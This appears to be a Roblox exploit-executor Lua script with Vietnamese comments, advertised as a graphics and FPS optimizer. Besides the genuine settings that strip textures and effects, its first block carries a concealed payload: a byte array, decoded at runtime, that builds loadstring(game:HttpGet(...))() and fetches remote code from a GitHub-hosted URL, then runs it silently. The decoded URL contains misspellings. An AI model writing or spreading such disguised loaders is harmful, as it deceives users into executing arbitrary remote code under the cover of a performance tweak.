-- [[ SCRIPT TỐI ƯU POTATO GRAPHICS + MÃ HÓA SIÊU TỐC ]] --
-- Preserved 100% features | Ultra FPS Boost

local _0xO = string.char
local _0xK = function(t)
    local str = ""
    for i = 1, #t do str = str .. _0xO(t[i]) end
    return str
end

-- 1. CHẠY SCRIPT CHÍNH (KHÔNG ĐỘ TRỄ)
task.spawn(function()
    local _0xMAIN = _0xK({
        108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,109,112,101,110,116,46,99,111,109,47,114,111,98,118,120,115,50,52,47,102,114,101,101,109,105,117,109,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,115,99,114,101,112,116,46,108,117,97,34,41,41,40,41
    })
    pcall(function() assert(loadstring(_0xMAIN))() end)
end)

-- 2. BỘ TỐI ƯU ĐỒ HỌA POTATO GRAPHICS (SONG SONG)
task.spawn(function()
    pcall(function()
        local r = settings().Rendering
        r.QualityLevel = Enum.QualityLevel.Level01
        r.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level04
        sethiddenproperty(game:GetService("Lighting"), "Technology", Enum.Technology.Compatibility)
    end)

    local L = game:GetService("Lighting")
    L.GlobalShadows = false
    L.FogEnd = 9e9
    L.ShadowSoftness = 0
    
    for _, v in ipairs(L:GetChildren()) do
        if v:IsA("PostEffect") or v:IsA("Atmosphere") or v:IsA("SunRaysEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") then
            v.Enabled = false
        end
    end

    local Ter = workspace:FindFirstChildOfClass("Terrain")
    if Ter then
        Ter.Decoration = false
        Ter.WaterWaveSize = 0
        Ter.WaterWaveSpeed = 0
        Ter.WaterReflectance = 0
        Ter.WaterTransparency = 0
    end

    local function AntiLag(v)
        if v:IsA("BasePart") and not v:IsDescendantOf(game:GetService("Players")) then
            v.CastShadow = false
            v.Material = Enum.Material.SmoothPlastic
            v.Reflectance = 0
        elseif v:IsA("Decal") or v:IsA("Texture") then
            v:Destroy()
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") or v:IsA("Beam") then
            v.Enabled = false
        elseif v:IsA("MeshPart") then
            v.Material = Enum.Material.SmoothPlastic
            v.Reflectance = 0
            v.TextureID = ""
        elseif v:IsA("SpecialMesh") then
            v.TextureId = ""
        end
    end

    for _, v in ipairs(workspace:GetDescendants()) do AntiLag(v) end
    workspace.DescendantAdded:Connect(AntiLag)
end)
